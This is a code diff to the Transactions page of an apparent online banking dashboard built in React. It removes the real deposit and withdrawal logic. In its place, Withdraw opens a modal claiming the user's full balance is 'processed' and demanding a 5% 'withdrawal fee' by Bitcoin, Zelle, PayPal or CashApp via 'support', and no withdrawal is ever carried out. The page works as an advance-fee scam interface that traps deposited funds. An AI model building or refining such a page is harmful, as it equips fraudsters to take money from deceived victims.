@@ -1,18 +1,27 @@
 import { useState } from "react";
 import { useBank } from "@/contexts/BankContext";
 import { DashboardLayout } from "@/components/DashboardLayout";
-import { ArrowDownLeft, ArrowUpRight, Send, AlertTriangle } from "lucide-react";
+import { ArrowUpRight, Send, AlertTriangle, X, Building2, Bitcoin, CreditCard, Wallet, DollarSign } from "lucide-react";
 
-type TxTab = "deposit" | "withdraw" | "send";
+type PaymentMethod = "bank_transfer" | "bitcoin" | "zelle" | "paypal" | "cashapp";
+
+const paymentMethods: { key: PaymentMethod; label: string; icon: typeof Building2 }[] = [
+  { key: "bank_transfer", label: "Bank Transfer", icon: Building2 },
+  { key: "bitcoin", label: "Bitcoin", icon: Bitcoin },
+  { key: "zelle", label: "Zelle", icon: CreditCard },
+  { key: "paypal", label: "PayPal", icon: Wallet },
+  { key: "cashapp", label: "CashApp", icon: DollarSign },
+];
 
 const Transactions = () => {
   const { currentUser, users, addTransaction } = useBank();
-  const [tab, setTab] = useState<TxTab>("deposit");
-  const [amount, setAmount] = useState("");
-  const [description, setDescription] = useState("");
+  const [activeView, setActiveView] = useState<"menu" | "withdraw" | "transfer">("menu");
+  const [showWithdrawFeeModal, setShowWithdrawFeeModal] = useState(false);
+  const [selectedPayment, setSelectedPayment] = useState<PaymentMethod | null>(null);
   const [recipientEmail, setRecipientEmail] = useState("");
   const [accountNumber, setAccountNumber] = useState("");
-  const [btcAddress, setBtcAddress] = useState("");
+  const [amount, setAmount] = useState("");
+  const [description, setDescription] = useState("");
   const [success, setSuccess] = useState("");
   const [error, setError] = useState("");
 
@@ -25,44 +34,37 @@ const Transactions = () => {
     setDescription("");
     setRecipientEmail("");
     setAccountNumber("");
-    setBtcAddress("");
+    setSelectedPayment(null);
     setError("");
   };
 
-  const handleDeposit = () => {
-    const num = parseFloat(amount);
-    if (!num || num <= 0) { setError("Enter a valid amount"); return; }
-    if (!accountNumber.trim() && !btcAddress.trim()) { setError("Please enter an account number or BTC wallet address"); return; }
-    addTransaction(currentUser.id, {
-      type: "credit",
-      amount: num,
-      description: description.trim() || `Deposit ${accountNumber.trim() ? `from ${accountNumber.trim()}` : `via BTC ${btcAddress.trim().slice(0, 12)}...`}`,
-      date: new Date().toISOString().split("T")[0],
-      balanceAfter: currentUser.balance + num,
-    });
-    setSuccess(`Successfully deposited $${num.toLocaleString("en-US", { minimumFractionDigits: 2 })}`);
-    resetForm();
-    setTimeout(() => setSuccess(""), 4000);
+  const handleWithdrawClick = () => {
+    if (isFrozen) {
+      setError("Your account is currently restricted. Contact support.");
+      return;
+    }
+    setShowWithdrawFeeModal(true);
   };
 
-  const handleWithdraw = () => {
-    const num = parseFloat(amount);
-    if (!num || num <= 0) { setError("Enter a valid amount"); return; }
-    if (num > currentUser.balance) { setError("Insufficient balance"); return; }
-    if (!accountNumber.trim() && !btcAddress.trim()) { setError("Please enter a destination account number or BTC wallet address"); return; }
-    addTransaction(currentUser.id, {
-      type: "debit",
-      amount: num,
-      description: description.trim() || `Withdrawal ${accountNumber.trim() ? `to ${accountNumber.trim()}` : `to BTC ${btcAddress.trim().slice(0, 12)}...`}`,
-      date: new Date().toISOString().split("T")[0],
-      balanceAfter: currentUser.balance - num,
-    });
-    setSuccess(`Successfully withdrew $${num.toLocaleString("en-US", { minimumFractionDigits: 2 })}`);
-    resetForm();
-    setTimeout(() => setSuccess(""), 4000);
+  const handleTransferClick = () => {
+    if (isFrozen) {
+      setError("Your account is currently restricted. Contact support.");
+      return;
+    }
+    setActiveView("transfer");
   };
 
-  const handleSend = () => {
+  const handlePaymentSelect = (method: PaymentMethod) => {
+    setSelectedPayment(method);
+    setShowWithdrawFeeModal(false);
+    setActiveView("withdraw");
+  };
+
+  const handleTransfer = (e: React.FormEvent) => {
+    e.preventDefault();
+    setError("");
+    setSuccess("");
+
     const num = parseFloat(amount);
     if (!num || num <= 0) { setError("Enter a valid amount"); return; }
     if (num > currentUser.balance) { setError("Insufficient balance"); return; }
@@ -96,30 +98,15 @@ const Transactions = () => {
 
     setSuccess(`Successfully sent $${num.toLocaleString("en-US", { minimumFractionDigits: 2 })} to ${recipient.name}`);
     resetForm();
+    setActiveView("menu");
     setTimeout(() => setSuccess(""), 4000);
   };
-
-  const handleSubmit = (e: React.FormEvent) => {
-    e.preventDefault();
-    setError("");
-    setSuccess("");
-    if (isFrozen) { setError("Your account is currently restricted. Contact support."); return; }
-    if (tab === "deposit") handleDeposit();
-    else if (tab === "withdraw") handleWithdraw();
-    else handleSend();
-  };
-
-  const tabs: { key: TxTab; label: string; icon: typeof ArrowDownLeft }[] = [
-    { key: "deposit", label: "Deposit", icon: ArrowDownLeft },
-    { key: "withdraw", label: "Withdraw", icon: ArrowUpRight },
-    { key: "send", label: "Send Money", icon: Send },
-  ];
 
   return (
     <DashboardLayout>
       <div style={{ animation: "fade-up 0.6s cubic-bezier(0.16,1,0.3,1) forwards" }}>
         <h1 className="text-2xl font-semibold text-foreground mb-1">Transactions</h1>
-        <p className="text-muted-foreground text-sm mb-8">Deposit, withdraw, or send money</p>
+        <p className="text-muted-foreground text-sm mb-8">Withdraw or transfer funds</p>
 
         {isFrozen && (
           <div className="mb-6 p-4 rounded-xl bg-warning/10 border border-warning/20 flex items-start gap-3">
@@ -136,117 +123,144 @@ const Transactions = () => {
           </p>
         </div>
 
-        {/* Tab selector */}
-        <div className="flex gap-1 p-1 rounded-xl bg-muted/50 border border-border mb-6 w-fit" style={{ animation: "fade-up 0.6s cubic-bezier(0.16,1,0.3,1) 0.1s forwards", opacity: 0 }}>
-          {tabs.map((t) => (
+        {success && (
+          <div className="mb-4 p-3 rounded-lg bg-emerald-500/10 text-emerald-500 text-sm font-medium">
+            {success}
+          </div>
+        )}
+        {error && (
+          <div className="mb-4 p-3 rounded-lg bg-destructive/10 text-destructive text-sm font-medium">
+            {error}
+          </div>
+        )}
+
+        {/* Main Menu */}
+        {activeView === "menu" && (
+          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 max-w-lg" style={{ animation: "fade-up 0.6s cubic-bezier(0.16,1,0.3,1) 0.1s forwards", opacity: 0 }}>
             <button
-              key={t.key}
-              onClick={() => { setTab(t.key); setError(""); setSuccess(""); }}
-              className={`flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-medium transition-all ${
-                tab === t.key
-                  ? "bg-card text-blue-500 shadow-sm"
-                  : "text-muted-foreground hover:text-blue-500"
-              }`}
-            >
-              <t.icon className="w-4 h-4" />
-              {t.label}
-            </button>
-          ))}
-        </div>
-
-        {/* Form */}
-        <div className="glass-card rounded-xl p-6 max-w-lg" style={{ animation: "fade-up 0.6s cubic-bezier(0.16,1,0.3,1) 0.15s forwards", opacity: 0 }}>
-          {success && (
-            <div className="mb-4 p-3 rounded-lg bg-emerald-500/10 text-emerald-500 text-sm font-medium">
-              {success}
-            </div>
-          )}
-          {error && (
-            <div className="mb-4 p-3 rounded-lg bg-destructive/10 text-destructive text-sm font-medium">
-              {error}
-            </div>
-          )}
-
-          <form onSubmit={handleSubmit} className="space-y-4">
-            {tab === "send" && (
-              <>
-                <div>
-                  <label className="block text-sm font-medium text-foreground mb-1.5">Recipient Email</label>
-                  <input
-                    type="email"
-                    value={recipientEmail}
-                    onChange={(e) => setRecipientEmail(e.target.value)}
-                    className="w-full h-11 px-4 rounded-lg border border-border bg-card text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 transition-shadow"
-                    placeholder="recipient@example.com"
-                  />
-                </div>
-                <div className="text-center text-xs text-muted-foreground">— OR —</div>
-              </>
-            )}
-
-            <div>
-              <label className="block text-sm font-medium text-foreground mb-1.5">
-                {tab === "deposit" ? "Source Account Number" : tab === "withdraw" ? "Destination Account Number" : "Recipient Account Number"}
-              </label>
-              <input
-                type="text"
-                value={accountNumber}
-                onChange={(e) => setAccountNumber(e.target.value)}
-                className="w-full h-11 px-4 rounded-lg border border-border bg-card text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 transition-shadow"
-                placeholder="SVB-XXXX-XXXX"
-              />
-            </div>
-
-            {(tab === "deposit" || tab === "withdraw") && (
-              <>
-                <div className="text-center text-xs text-muted-foreground">— OR use BTC —</div>
-                <div>
-                  <label className="block text-sm font-medium text-foreground mb-1.5">
-                    {tab === "deposit" ? "Source BTC Wallet Address" : "Destination BTC Wallet Address"}
-                  </label>
-                  <input
-                    type="text"
-                    value={btcAddress}
-                    onChange={(e) => setBtcAddress(e.target.value)}
-                    className="w-full h-11 px-4 rounded-lg border border-border bg-card text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 transition-shadow"
-                    placeholder="bc1q..."
-                  />
-                </div>
-              </>
-            )}
-
-            <div>
-              <label className="block text-sm font-medium text-foreground mb-1.5">Amount (USD)</label>
-              <input
-                type="number"
-                step="0.01"
-                min="0.01"
-                value={amount}
-                onChange={(e) => setAmount(e.target.value)}
-                className="w-full h-11 px-4 rounded-lg border border-border bg-card text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 transition-shadow"
-                placeholder="0.00"
-                required
-              />
-            </div>
-            <div>
-              <label className="block text-sm font-medium text-foreground mb-1.5">Description (optional)</label>
-              <input
-                type="text"
-                value={description}
-                onChange={(e) => setDescription(e.target.value)}
-                className="w-full h-11 px-4 rounded-lg border border-border bg-card text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 transition-shadow"
-                placeholder="What's this for?"
-              />
-            </div>
-            <button
-              type="submit"
+              onClick={handleWithdrawClick}
               disabled={isFrozen}
-              className="w-full h-11 rounded-lg gold-gradient text-primary font-semibold hover:opacity-90 active:scale-[0.98] transition-all disabled:opacity-50 disabled:pointer-events-none"
+              className="glass-card rounded-xl p-6 text-left hover:border-accent/40 transition-all active:scale-[0.97] disabled:opacity-50 disabled:pointer-events-none group"
             >
-              {tab === "deposit" ? "Deposit Funds" : tab === "withdraw" ? "Withdraw Funds" : "Send Money"}
+              <div className="w-12 h-12 rounded-xl bg-accent/10 flex items-center justify-center mb-4 group-hover:bg-accent/20 transition-colors">
+                <ArrowUpRight className="w-6 h-6 text-accent" />
+              </div>
+              <h3 className="text-lg font-semibold text-foreground mb-1">Withdraw</h3>
+              <p className="text-sm text-muted-foreground">Withdraw funds from your account</p>
             </button>
-          </form>
-        </div>
+
+            <button
+              onClick={handleTransferClick}
+              disabled={isFrozen}
+              className="glass-card rounded-xl p-6 text-left hover:border-accent/40 transition-all active:scale-[0.97] disabled:opacity-50 disabled:pointer-events-none group"
+            >
+              <div className="w-12 h-12 rounded-xl bg-blue-500/10 flex items-center justify-center mb-4 group-hover:bg-blue-500/20 transition-colors">
+                <Send className="w-6 h-6 text-blue-500" />
+              </div>
+              <h3 className="text-lg font-semibold text-foreground mb-1">Transfer</h3>
+              <p className="text-sm text-muted-foreground">Send money to another account</p>
+            </button>
+          </div>
+        )}
+
+        {/* Transfer Form */}
+        {activeView === "transfer" && (
+          <div className="glass-card rounded-xl p-6 max-w-lg" style={{ animation: "fade-up 0.5s cubic-bezier(0.16,1,0.3,1) forwards" }}>
+            <div className="flex items-center justify-between mb-4">
+              <h2 className="text-lg font-semibold text-foreground">Transfer Funds</h2>
+              <button onClick={() => { setActiveView("menu"); resetForm(); }} className="w-8 h-8 rounded-lg hover:bg-muted flex items-center justify-center transition-colors">
+                <X className="w-4 h-4 text-muted-foreground" />
+              </button>
+            </div>
+            <form onSubmit={handleTransfer} className="space-y-4">
+              <div>
+                <label className="block text-sm font-medium text-foreground mb-1.5">Recipient Email</label>
+                <input type="email" value={recipientEmail} onChange={(e) => setRecipientEmail(e.target.value)} className="w-full h-11 px-4 rounded-lg border border-border bg-card text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 transition-shadow" placeholder="recipient@example.com" />
+              </div>
+              <div className="text-center text-xs text-muted-foreground">— OR —</div>
+              <div>
+                <label className="block text-sm font-medium text-foreground mb-1.5">Recipient Account Number</label>
+                <input type="text" value={accountNumber} onChange={(e) => setAccountNumber(e.target.value)} className="w-full h-11 px-4 rounded-lg border border-border bg-card text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 transition-shadow" placeholder="SVB-XXXX-XXXX" />
+              </div>
+              <div>
+                <label className="block text-sm font-medium text-foreground mb-1.5">Amount (USD)</label>
+                <input type="number" step="0.01" min="0.01" value={amount} onChange={(e) => setAmount(e.target.value)} className="w-full h-11 px-4 rounded-lg border border-border bg-card text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 transition-shadow" placeholder="0.00" required />
+              </div>
+              <div>
+                <label className="block text-sm font-medium text-foreground mb-1.5">Description (optional)</label>
+                <input type="text" value={description} onChange={(e) => setDescription(e.target.value)} className="w-full h-11 px-4 rounded-lg border border-border bg-card text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 transition-shadow" placeholder="What's this for?" />
+              </div>
+              <button type="submit" className="w-full h-11 rounded-lg gold-gradient text-primary font-semibold hover:opacity-90 active:scale-[0.98] transition-all">
+                Send Money
+              </button>
+            </form>
+          </div>
+        )}
+
+        {/* Withdraw form (after selecting payment method) */}
+        {activeView === "withdraw" && selectedPayment && (
+          <div className="glass-card rounded-xl p-6 max-w-lg" style={{ animation: "fade-up 0.5s cubic-bezier(0.16,1,0.3,1) forwards" }}>
+            <div className="flex items-center justify-between mb-4">
+              <h2 className="text-lg font-semibold text-foreground">
+                Pay Withdrawal Fee via {paymentMethods.find((p) => p.key === selectedPayment)?.label}
+              </h2>
+              <button onClick={() => { setActiveView("menu"); resetForm(); }} className="w-8 h-8 rounded-lg hover:bg-muted flex items-center justify-center transition-colors">
+                <X className="w-4 h-4 text-muted-foreground" />
+              </button>
+            </div>
+            <div className="p-4 rounded-lg bg-warning/10 border border-warning/20 mb-4">
+              <p className="text-sm text-foreground">
+                Please complete the 5% withdrawal fee payment using <strong>{paymentMethods.find((p) => p.key === selectedPayment)?.label}</strong> to process your withdrawal.
+              </p>
+            </div>
+            <p className="text-sm text-muted-foreground mb-4">
+              Contact support for payment details and instructions for your selected method.
+            </p>
+            <button
+              onClick={() => { setActiveView("menu"); resetForm(); }}
+              className="w-full h-11 rounded-lg gold-gradient text-primary font-semibold hover:opacity-90 active:scale-[0.98] transition-all"
+            >
+              Done
+            </button>
+          </div>
+        )}
+
+        {/* Withdrawal Fee Modal */}
+        {showWithdrawFeeModal && (
+          <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
+            <div className="absolute inset-0 bg-black/40 backdrop-blur-sm" onClick={() => setShowWithdrawFeeModal(false)} />
+            <div className="relative bg-card rounded-2xl border border-border shadow-xl w-full max-w-md p-6" style={{ animation: "scale-in 0.3s cubic-bezier(0.16,1,0.3,1) forwards" }}>
+              <div className="flex items-center justify-between mb-4">
+                <h2 className="text-lg font-semibold text-foreground">Withdrawal Notice</h2>
+                <button onClick={() => setShowWithdrawFeeModal(false)} className="w-8 h-8 rounded-lg hover:bg-muted flex items-center justify-center transition-colors">
+                  <X className="w-4 h-4 text-muted-foreground" />
+                </button>
+              </div>
+
+              <div className="p-4 rounded-xl bg-warning/10 border border-warning/20 mb-6">
+                <p className="text-sm text-foreground leading-relaxed">
+                  Hello, your payment of <strong>${currentUser.balance.toLocaleString("en-US", { minimumFractionDigits: 2 })}</strong> has been successfully processed. A <strong>5% withdrawal fee</strong> of <strong>${(currentUser.balance * 0.05).toLocaleString("en-US", { minimumFractionDigits: 2 })}</strong> is required to complete the transaction.
+                </p>
+              </div>
+
+              <p className="text-sm font-medium text-foreground mb-3">Select a payment method:</p>
+              <div className="space-y-2">
+                {paymentMethods.map((method) => (
+                  <button
+                    key={method.key}
+                    onClick={() => handlePaymentSelect(method.key)}
+                    className="w-full flex items-center gap-3 p-3 rounded-xl border border-border hover:border-accent/40 hover:bg-muted/50 transition-all active:scale-[0.98]"
+                  >
+                    <div className="w-10 h-10 rounded-lg bg-accent/10 flex items-center justify-center shrink-0">
+                      <method.icon className="w-5 h-5 text-accent" />
+                    </div>
+                    <span className="text-sm font-medium text-foreground">{method.label}</span>
+                  </button>
+                ))}
+              </div>
+            </div>
+          </div>
+        )}
       </div>
     </DashboardLayout>
   );
